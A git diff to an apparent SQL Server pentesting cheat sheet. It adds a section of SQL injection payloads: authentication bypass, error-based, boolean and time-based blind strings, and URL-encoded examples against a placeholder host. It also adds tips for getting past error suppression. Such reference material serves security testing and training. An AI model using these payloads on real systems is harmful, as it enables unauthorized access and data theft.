@@ -63,7 +63,10 @@ SQL Server Instance
 └── Agent Jobs
 ```
 
-| **Task** | **SQL Command / View** | **Description** |
+
+
+## ✨ Additional Enumeration & Tips
+
 | --- | --- | --- |
 | List all databases | `SELECT * FROM sys.databases;` | Lists all databases on the SQL Server instance |
 | List all tables in current database | `SELECT * FROM sys.tables;` | Shows user-defined tables |
@@ -121,3 +124,49 @@ SQL Server Instance
 - `sys.dm_exec_connections` — IPs and connection info.
 - `sys.dm_exec_query_stats` — Query performance info.
 - `sys.dm_os_sys_info` — System information (memory, CPU, etc.)
+
+
+---
+
+## 🎯 SQL Injection: Useful Payloads and Techniques
+
+### 🔍 Classic Payloads (Authentication Bypass)
+```sql
+' OR '1'='1 --
+admin' -- 
+admin' #
+admin'/*
+```
+
+### 🧪 Error-Based Injection
+```sql
+' AND 1=CONVERT(int, (SELECT @@version)) --
+```
+
+### 🕵️ Blind Boolean-Based
+```sql
+' AND 1=1 -- (True)
+' AND 1=2 -- (False)
+```
+
+### ⏱️ Time-Based (Blind)
+```sql
+'; WAITFOR DELAY '00:00:05';--
+' OR 1=1 WAITFOR DELAY '00:00:10';--
+```
+
+### 🌐 URL-Encoded Examples
+```text
+https://target.com/login?user=admin'--&pass=123
+https://target.com/item?id=1+AND+1=1--
+https://target.com/item?id=1'+AND+SLEEP(5)--+
+```
+
+---
+
+## 🔍 SQL Server Injection Tips
+
+- Use `CAST`, `CONVERT`, or string concatenation to extract information.
+- Use delays to measure blind injection viability.
+- If errors are suppressed, try encoding special characters in URL or using `CHAR()` function.
+
